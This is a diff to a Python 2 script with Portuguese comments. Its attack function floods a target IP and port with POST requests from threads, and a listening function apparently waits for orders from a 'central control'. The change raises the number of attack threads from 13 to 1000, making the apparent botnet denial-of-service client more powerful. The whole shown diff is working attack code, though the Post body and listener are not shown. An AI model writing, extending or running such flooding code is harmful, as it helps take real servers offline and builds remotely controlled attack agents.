@@ -20,54 +20,19 @@ def Post(url,attackedServerPort):
         print r.text
 
     
-
+channel = []
 #Funcao que ira criar as Threas 
 def attack(IP, attackedServerPort):
 
-    #Definicao das 5 threads 
-    channel1 = Thread(target= Post, args= [IP, attackedServerPort])
-    channel2 = Thread(target= Post, args= [IP, attackedServerPort])
-    channel3 = Thread(target= Post, args= [IP, attackedServerPort])
-    channel4 = Thread(target= Post, args= [IP, attackedServerPort])
-    channel5 = Thread(target= Post, args= [IP, attackedServerPort])
-    channel6 = Thread(target= Post, args= [IP, attackedServerPort])
-    channel7 = Thread(target= Post, args= [IP, attackedServerPort])
-    channel8 = Thread(target= Post, args= [IP, attackedServerPort])
-    channel9 = Thread(target= Post, args= [IP, attackedServerPort])
-    channel10 = Thread(target= Post, args= [IP, attackedServerPort])
-    channel11 = Thread(target= Post, args= [IP, attackedServerPort])
-    channel12 = Thread(target= Post, args= [IP, attackedServerPort])
-    channel13 = Thread(target= Post, args= [IP, attackedServerPort])
+    #Definicao das n threads
+    for i in range(0, 1000):
+        channel.append(Thread(target=Post, args=[IP, attackedServerPort]))
 
-    #seta as threads como daemon = true para que elas possam ser destruidas
-    channel1.setDaemon(True)
-    channel2.setDaemon(True)
-    channel3.setDaemon(True)
-    channel4.setDaemon(True)
-    channel5.setDaemon(True)
-    channel6.setDaemon(True)
-    channel7.setDaemon(True)
-    channel8.setDaemon(True)
-    channel9.setDaemon(True)
-    channel10.setDaemon(True)
-    channel11.setDaemon(True)
-    channel12.setDaemon(True)
-    channel13.setDaemon(True)
-    
-    #Inicia as threads
-    channel1.start()
-    channel2.start()
-    channel3.start()
-    channel4.start()
-    channel5.start()
-    channel6.start()
-    channel7.start()
-    channel8.start()
-    channel9.start()
-    channel10.start()
-    channel11.start()
-    channel12.start()
-    channel13.start()
+    for i in range(0, 1000):
+        #seta as threads como daemon = true para que elas possam ser destruidas
+        channel[i].setDaemon(True)
+        #Inicia as threads
+        channel[i].start()
 
 #Funcao que escuta o controle central
 def listening():
